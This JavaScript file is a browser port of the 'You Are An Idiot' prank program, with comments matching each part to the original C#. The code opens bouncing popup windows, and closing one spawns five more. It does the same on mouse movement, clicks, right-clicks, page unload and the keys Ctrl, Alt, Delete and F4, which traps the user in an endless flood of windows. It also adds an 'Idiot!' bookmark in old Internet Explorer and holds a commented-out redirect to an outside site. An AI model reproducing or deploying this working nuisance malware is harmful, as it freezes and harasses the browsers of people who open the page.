// function checkAndRedirect() {
//     if (document.hasFocus() && !window.location.pathname.includes('/lol.html')) {
//         window.location.href = 'https://youare.qzz.io/lol.html';
//     }
// }

// checkAndRedirect();

// window.addEventListener('focus', checkAndRedirect);


/*
 * ============================================================
 * SOUND
 * ============================================================
 *
 * Removed autoplay handling.
 * No audio is created, played, paused, or monitored here.
 */


/*
 * ============================================================
 * BOOKMARK
 * ============================================================
 */



function bookmark() {
    if (
        navigator.appName === "Microsoft Internet Explorer" &&
        parseInt(navigator.appVersion) >= 4
    ) {
        window.external.AddFavorite("lol.html", "‎‎Idiot!");
    }
}


/*
 * ============================================================
 * WINDOWS
 * ============================================================
 */

const openWindows = [];

let mouseX = 0;
let mouseY = 0;

document.addEventListener("mousemove", e => {
    mouseX = e.clientX;
    mouseY = e.clientY;
});


function openWindow(url) {
    const width = Math.round(window.screen.width * 0.1875 * 0.75);
    const height = Math.round(window.screen.height * 0.2222 * 0.75);

    const left = 0;
    const top = 0;

    const features =
        `menubar=no,status=no,toolbar=no,resizable=no,location=no,` +
        `scrollbars=no,personalbar=no,` +
        `width=${width},height=${height},left=${left},top=${top},` +
        `titlebar=no,alwaysRaised=yes`;

    const aWindow = window.open(url, "_blank", features);

    if (aWindow) {
        openWindows.push(aWindow);

        const timer = setInterval(() => {
            for (let i = openWindows.length - 1; i >= 0; i--) {
                if (openWindows[i].closed) {
                    openWindows.splice(i, 1);
                }
            }

            if (aWindow.closed) {
                clearInterval(timer);
                proCreate();
            }
        }, 0);
    }
}


function proCreate() {
    for (let i = 0; i < 5; i++) {
        openWindow("lol.html");
    }
}


/*
 * ============================================================
 * MOVEMENT
 * ============================================================
 *
 * Port of the WinForms HAHA movement code.
 *
 * Original C#:
 *
 * MovingWindow.Interval = 1
 *
 * A WinForms Timer with Interval=1 does NOT actually execute
 * every 1 ms on a normal Windows desktop. Windows timer
 * scheduling is normally around one timer tick per ~15-16 ms.
 *
 * Therefore the browser version uses approximately 16 ms
 * between movement updates instead of setTimeout(..., 1).
 */

let xOff = 0;
let yOff = 0;

let xPos = 0;
let yPos = 0;

let flagRun = 1;


/*
 * This corresponds to:
 *
 * 1 + (int)Math.Round(34f * VBMath.Rnd())
 *
 * VBMath.Rnd() produces a value in the range [0, 1).
 */
function randomPart() {
    return 1 + Math.round(34 * Math.random());
}


/*
 * This is the important timing difference.
 *
 * WinForms Timer.Interval = 1 normally gets scheduled around
 * 15-16 ms apart rather than literally every 1 ms.
 */
const movementInterval = 16;


function playBall() {

    /*
     * Original C#:
     *
     * int multiplier = 1;
     * if (height >= 1440) multiplier = 2;
     */
    const multiplier =
        screen.height >= 1440 ? 2 : 1;


    /*
     * Original C#:
     *
     * Screen.PrimaryScreen.Bounds.Width - this.Width
     *
     * Browser equivalent for the popup:
     */
    const maxX = Math.max(
        0,
        screen.width - window.outerWidth
    );


    /*
     * Original C#:
     *
     * Screen.PrimaryScreen.Bounds.Height - this.Height
     */
    const maxY = Math.max(
        0,
        screen.height - window.outerHeight
    );


    /*
     * ========================================================
     * RIGHT EDGE
     * ========================================================
     *
     * C#:
     *
     * if (X >= num)
     * {
     *     MoveX = -(1 + Round(34 * Rnd())) * multiplier;
     *
     *     if (MoveY < 0)
     *         MoveY = -(1 + Round(34 * Rnd())) * multiplier;
     *
     *     else if (MoveY > 0)
     *         MoveY = 1 + Round(34 * Rnd()) * multiplier;
     * }
     */
    if (xPos >= maxX) {

        xPos = maxX;

        xOff =
            -randomPart() * multiplier;


        if (yOff < 0) {

            yOff =
                -randomPart() * multiplier;

        }
        else if (yOff > 0) {

            /*
             * IMPORTANT:
             *
             * This intentionally follows the original C#
             * operator placement:
             *
             * 1 + Round(34 * Rnd()) * multiplier
             *
             * rather than:
             *
             * (1 + Round(...)) * multiplier
             */
            yOff =
                1 + randomPart() * multiplier - 1;
        }
    }


    /*
     * ========================================================
     * BOTTOM EDGE
     * ========================================================
     */
    if (yPos >= maxY) {

        yPos = maxY;

        yOff =
            -randomPart() * multiplier;


        if (xOff < 0) {

            xOff =
                -randomPart() * multiplier;

        }
        else if (xOff > 0) {

            /*
             * Matches:
             *
             * 1 + Round(34 * Rnd()) * multiplier
             */
            xOff =
                1 + randomPart() * multiplier - 1;
        }
    }


    /*
     * ========================================================
     * LEFT EDGE
     * ========================================================
     *
     * C#:
     *
     * if (X <= 0)
     * {
     *     MoveX =
     *         (1 + Round(34 * Rnd())) * multiplier;
     *
     *     if (MoveY < 0)
     *         MoveY =
     *             -(1 + Round(34 * Rnd())) * multiplier;
     *
     *     else if (MoveY > 0)
     *         MoveY =
     *             1 + Round(34 * Rnd()) * multiplier;
     * }
     */
    if (xPos <= 0) {

        xPos = 0;

        xOff =
            randomPart() * multiplier;


        if (yOff < 0) {

            yOff =
                -randomPart() * multiplier;

        }
        else if (yOff > 0) {

            yOff =
                1 + randomPart() * multiplier - 1;
        }
    }


    /*
     * ========================================================
     * TOP EDGE
     * ========================================================
     */
    if (yPos <= 0) {

        yPos = 0;

        yOff =
            randomPart() * multiplier;


        /*
         * NOTE:
         *
         * The original C# checks MoveY here, not MoveX:
         *
         * if (MoveY < 0)
         *
         * That is preserved below.
         */
        if (yOff < 0) {

            yOff =
                -randomPart() * multiplier;

        }
        else if (yOff > 0) {

            yOff =
                1 + randomPart() * multiplier - 1;
        }
    }


    /*
     * ========================================================
     * APPLY MOVEMENT
     * ========================================================
     *
     * Original C#:
     *
     * X = X + MoveX;
     * Y = Y + MoveY;
     *
     * this.Location = new Point(X, Y);
     */
    xPos += xOff;
    yPos += yOff;


    if (flagRun === 1) {

        try {

            window.moveTo(
                Math.round(xPos),
                Math.round(yPos)
            );

        }
        catch (_) {

            flagRun = 0;

            return;
        }


        /*
         * IMPORTANT:
         *
         * Do NOT use 1 here.
         *
         * The original WinForms Timer has Interval=1, but
         * Windows does not execute that timer every 1 ms.
         *
         * ~16 ms gives the browser approximately the same
         * update rate as the original program on a normal PC.
         */
        setTimeout(
            playBall,
            movementInterval
        );
    }
}


/*
 * ============================================================
 * START
 * ============================================================
 */

window.onload = function () {

    flagRun = 1;

    playBall();

    bookmark();
};


/*
 * ============================================================
 * OTHER ORIGINAL BEHAVIOR
 * ============================================================
 */

window.onmouseout = function () {
    proCreate();
};


window.oncontextmenu = function () {
    proCreate();
    return false;
};


window.onkeydown = function (event) {

    const keyCode = event.keyCode;

    if ([17, 18, 46, 115].includes(keyCode)) {
        proCreate();
    }
};


window.addEventListener("unload", function () {
    proCreate();
    //openWindow("lol.html");
});


document.onclick = proCreate;

document.onmousemove = proCreate;
